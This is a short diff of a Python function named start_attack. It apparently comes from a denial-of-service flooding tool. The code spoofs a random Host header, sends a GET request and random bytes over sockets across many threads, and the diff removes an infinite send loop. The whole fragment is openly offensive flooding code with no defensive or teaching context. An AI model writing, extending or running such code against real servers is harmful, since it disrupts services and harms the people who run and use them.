@@ -18,9 +18,8 @@ def start_attack():
         fake_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
         host_header = f"Host: {fake_ip}\r\n"
         payload = f"GET / HTTP/1.1\r\n{host_header}\r\n"
-        while True:
-            s.send(payload.encode())
-            s.send(os.urandom(num_bytes))
+        s.send(payload.encode())
+        s.send(os.urandom(num_bytes))
         
 
     for _ in range(data.get('threads', 10)):
